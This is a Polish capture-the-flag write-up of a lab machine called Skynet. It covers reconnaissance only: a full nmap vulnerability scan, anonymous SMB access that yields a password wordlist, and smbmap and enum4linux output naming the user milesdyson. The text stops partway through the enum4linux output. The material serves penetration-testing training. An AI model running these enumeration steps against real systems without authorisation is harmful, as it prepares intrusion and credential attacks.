# Skynet
![](/graphic/skynet_start.png)

## Nmap:
Sprawdzam co mogę znaleść za pomocą narzędzia `nmap`.
Nmap pokazuje mi otwarte porty i dostępne usługi.

![](/graphic/skynet_nmap_porty_uslugi.bmp)
```
─$ sudo nmap -Pn -A -sV --script=default,vuln -p- --open -oA Skynet_nmap 10.10.37.27
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-29 03:53 EDT
Nmap scan report for 10.10.37.27
Host is up (0.081s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       PACKETSTORM:140070      7.8     https://vulners.com/packetstorm/PACKETSTORM:140070      *EXPLOIT*
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8     https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    *EXPLOIT*
|       EDB-ID:40888    7.8     https://vulners.com/exploitdb/EDB-ID:40888      *EXPLOIT*
|       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858
|       CVE-2016-6515   7.8     https://vulners.com/cve/CVE-2016-6515
|       1337DAY-ID-26494        7.8     https://vulners.com/zdt/1337DAY-ID-26494        *EXPLOIT*
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       CVE-2016-10009  7.5     https://vulners.com/cve/CVE-2016-10009
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       SSV:92582       7.2     https://vulners.com/seebug/SSV:92582    *EXPLOIT*
|       CVE-2016-10012  7.2     https://vulners.com/cve/CVE-2016-10012
|       CVE-2015-8325   7.2     https://vulners.com/cve/CVE-2015-8325
|       SSV:92580       6.9     https://vulners.com/seebug/SSV:92580    *EXPLOIT*
|       CVE-2016-10010  6.9     https://vulners.com/cve/CVE-2016-10010
|       1337DAY-ID-26577        6.9     https://vulners.com/zdt/1337DAY-ID-26577        *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       SSV:91041       5.5     https://vulners.com/seebug/SSV:91041    *EXPLOIT*
|       PACKETSTORM:140019      5.5     https://vulners.com/packetstorm/PACKETSTORM:140019      *EXPLOIT*
|       PACKETSTORM:136234      5.5     https://vulners.com/packetstorm/PACKETSTORM:136234      *EXPLOIT*
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5     https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    *EXPLOIT*
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5     https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    *EXPLOIT*
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5     https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330    *EXPLOIT*
|       EDB-ID:40858    5.5     https://vulners.com/exploitdb/EDB-ID:40858      *EXPLOIT*
|       EDB-ID:40119    5.5     https://vulners.com/exploitdb/EDB-ID:40119      *EXPLOIT*
|       EDB-ID:39569    5.5     https://vulners.com/exploitdb/EDB-ID:39569      *EXPLOIT*
|       CVE-2016-3115   5.5     https://vulners.com/cve/CVE-2016-3115
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    *EXPLOIT*
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    *EXPLOIT*
|       EDB-ID:40136    4.3     https://vulners.com/exploitdb/EDB-ID:40136      *EXPLOIT*
|       EDB-ID:40113    4.3     https://vulners.com/exploitdb/EDB-ID:40113      *EXPLOIT*
|       CVE-2023-29323  4.3     https://vulners.com/cve/CVE-2023-29323
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-6210   4.3     https://vulners.com/cve/CVE-2016-6210
|       1337DAY-ID-25440        4.3     https://vulners.com/zdt/1337DAY-ID-25440        *EXPLOIT*
|       1337DAY-ID-25438        4.3     https://vulners.com/zdt/1337DAY-ID-25438        *EXPLOIT*
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|       SSV:92581       2.1     https://vulners.com/seebug/SSV:92581    *EXPLOIT*
|       CVE-2016-10011  2.1     https://vulners.com/cve/CVE-2016-10011
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT*
|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Skynet
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.37.27
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.37.27:80/
|     Form id: 
|_    Form action: #
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       CVE-2023-25690  7.5     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    7.5     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2016-5387   6.8     https://vulners.com/cve/CVE-2016-5387
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       CVE-2022-36760  5.1     https://vulners.com/cve/CVE-2022-36760
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355    *EXPLOIT*
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
|       EDB-ID:40909    5.0     https://vulners.com/exploitdb/EDB-ID:40909      *EXPLOIT*
|       CVE-2022-37436  5.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740
|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979
|       CVE-2006-20001  5.0     https://vulners.com/cve/CVE-2006-20001
|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|_      PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /squirrelmail/src/login.php: squirrelmail version 1.4.23 [svn]
|_  /squirrelmail/images/sm_logo.png: SquirrelMail
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL SASL AUTH-RESP-CODE PIPELINING TOP CAPA RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 more listed IMAP4rev1 OK capabilities post-login Pre-login SASL-IR LITERAL+ have LOGIN-REFERRALS IDLE ID ENABLE
445/tcp open  DD          Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=6/29%OT=22%CT=1%CU=37418%PV=Y%DS=2%DC=T%G=Y%TM=649D3A0
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=103%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)SEQ(SP=FE%GCD=1%ISR=102%TI=Z%C
OS:I=I%TS=8)SEQ(SP=FF%GCD=1%ISR=102%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%
OS:O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11
OS:)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W
OS:=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-vuln-ms10-061: false
|_clock-skew: mean: 1h39m58s, deviation: 2h53m13s, median: -2s
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
| smb2-time: 
|   date: 2023-06-29T07:54:38
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb-vuln-ms10-054: false
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2023-06-29T02:54:39-05:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   97.51 ms 10.8.0.1
2   86.28 ms 10.10.37.27

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 405.46 seconds
```
Zaciekawiła mnie usługa `smb`, do której spróbowałem uzyskać dostęp bez hasła. Znalazłem tam plik `attention.txt` i katalog `logs`. W katalogu `logs` znalazłem plik `log1.txt`. Po pobraniu obu plików okazało się, że plik `lop1.txt` to słownik haseł a plik `attention.txt` zawiera wiadomość z podpisem `
## SMBCLIENT /anonymous:
```
─$ smbclient //10.10.37.27/anonymous                                         
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5831104 blocks available           
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5831096 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)                                                                                                                                         
smb: \logs\> cd ..                                                              smb: \logs\> ^C
```

## Zawartość pliku `log1.txt`:
```
─$ cat log1.txt     
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```


## SMBmap: 
```
─$ smbmap -H 10.10.37.27                                                
[+] Guest session       IP: 10.10.37.27:445     Name: 10.10.37.27                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
                                                                                                                                                                                                                                            

─$ smbclient -N -L ////10.10.37.27                                    


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
```
Znów znajduję nazwę użytkownika Tym razem w części `Comment` widać imię i nazwisko `Miles Dyson`, prawdopodobnie jest to nazwa użytkownika.


## lin4enum:
```
$ enum4linux -a 10.10.37.27 2> Skyne_enum4linux.txt
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jun 29 04:36:19 2023

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                            
Target ........... 10.10.37.27                                                                                                                                                                                                              
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.37.27 )============================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Got domain/workgroup name: WORKGROUP                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ================================( Nbtstat Information for 10.10.37.27 )================================
                                                                                                                                                                                                                                            
Looking up status of 10.10.37.27                                                                                                                                                                                                            
        SKYNET          <00> -         B <ACTIVE>  Workstation Service
        SKYNET          <03> -         B <ACTIVE>  Messenger Service
        SKYNET          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================( Session Check on 10.10.37.27 )====================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Server 10.10.37.27 allows sessions using username '', password ''                                                                                                                                                                       
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 =================================( Getting domain SID for 10.10.37.27 )=================================
                                                                                                                                                                                                                                            
Domain Name: WORKGROUP                                                                                                                                                                                                                      
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ===================================( OS information on 10.10.37.27 )===================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Can't get OS info with smbclient                                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Got OS info for 10.10.37.27 from srvinfo:                                                                                                                                                                                               
        SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)                                                                                                                                                                   
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ========================================( Users on 10.10.37.27 )========================================
                                                                                                                                                                                                                                            
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc:                                                                                                                                                               

user:[milesdyson] rid:[0x3e8]

 ==================================( Share Enumeration on 10.10.37.27 )==================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET

[+] Attempting to map shares on 10.10.37.27                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
//10.10.37.27/print$    Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                                           
//10.10.37.27/anonymous Mapping: OK Listing: OK Writing: N/A
//10.10.37.27/milesdyson        Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                                                                                              
                                                                                                                                                                                                                                            
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                                                                  
//10.10.37.27/IPC$      Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.37.27 )============================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

[+] Attaching to 10.10.37.27 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] SKYNET
        [+] Builtin

[+] Password Info for Domain: SKYNET

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
Password Complexity: Disabled                                                                                                                                                                                                               
Minimum Password Length: 5


 =======================================( Groups on 10.10.37.27 )=======================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting builtin group memberships:                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting local groups:                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting local group memberships:                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting domain groups:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting domain group memberships:                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ===================( Users on 10.10.37.27 via RID cycling (RIDS: 500-550,1000-1050) )===================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[I] Found new SID:                                                                                                                                                                                                                          
S-1-22-1                                                                                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    
